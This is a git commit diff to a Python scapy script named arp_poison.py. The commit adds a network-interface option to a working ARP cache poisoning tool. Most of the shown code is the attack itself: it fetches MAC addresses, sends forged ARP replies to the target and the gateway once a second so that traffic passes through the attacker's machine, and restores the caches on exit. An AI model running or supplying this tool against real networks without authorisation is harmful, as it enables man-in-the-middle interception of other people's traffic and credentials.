9451becd24a720e125d95b0582287ccb6783845e
Alper Altun <qXdarknessXq@gmail.com>
2022-09-05 00:00:05 +0300

    Update arp_poison.py

--- arp_poison.py
+++ arp_poison.py
@@ -5,6 +5,7 @@ import time
 #User Inputs
 def inputs():
     value = OptionParser()
+    value.add_option("-i","--interface",dest="interface",help="This is your router name")
     value.add_option("-t","--target",dest="target",help="This is your attack IP")
     value.add_option("-r","--range",dest="range",help="This is your range IP")
     key = value.parse_args()[0]
@@ -14,18 +15,18 @@ def inputs():
         print("You have to enter an IP or range IP")
 
 #Mac Adress
-def get_mac(IP):
+def get_mac(IP,interface):
     ip_packet = scapy.ARP(pdst=IP)
     mac_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
     combined_packets = mac_packet/ip_packet
-    answer = scapy.srp(combined_packets,timeout=1,verbose=False)[0]
+    answer = scapy.srp(combined_packets,iface=interface,timeout=1,verbose=False)[0]
     return answer[0][1].hwsrc # ["8","0".."0","1"] şeklinde yazamamsı için liste içinden çıkardım.
 
 
 #Arp Poison
-def arp_poison(target,range):
-    target_mac = get_mac(target)
-    range_mac = get_mac(range)
+def arp_poison(target,range,interface):
+    target_mac = get_mac(target,interface)
+    range_mac = get_mac(range,interface)
 
     poison_target_packet = scapy.ARP(pdst=target,hwdst=target_mac,psrc=range)
     poison_range_packet =  scapy.ARP(pdst=range,hwdst=range_mac,psrc=target)
@@ -34,9 +35,9 @@ def arp_poison(target,range):
     scapy.send(poison_target_packet,verbose=False)
 
 #Restart Arp Poison
-def unarp_poison(target,range):
-    target_mac = get_mac(target)
-    range_mac = get_mac(range)
+def unarp_poison(target,range,interface):
+    target_mac = get_mac(target,interface)
+    range_mac = get_mac(range,interface)
 
     unpoison_target_packet = scapy.ARP(pdst=target,hwdst=target_mac,hwsrc=range_mac,psrc=range)
     unpoison_range_packet = scapy.ARP(pdst=range,hwdst=range_mac,hwsrc=target_mac,psrc=target)
@@ -49,11 +50,11 @@ number = 0
 
 try:
     while True:
-        arp_poison(key.target,key.range)
+        arp_poison(key.target,key.range,key.interface)
         time.sleep(1)
         number +=2
         print(f"\rPackets sending: {number} ",end="")
 
 except:
     print("\nOkay, see you later!")
-    unarp_poison(key.target,key.range)
+    unarp_poison(key.target,key.range,key.interface)
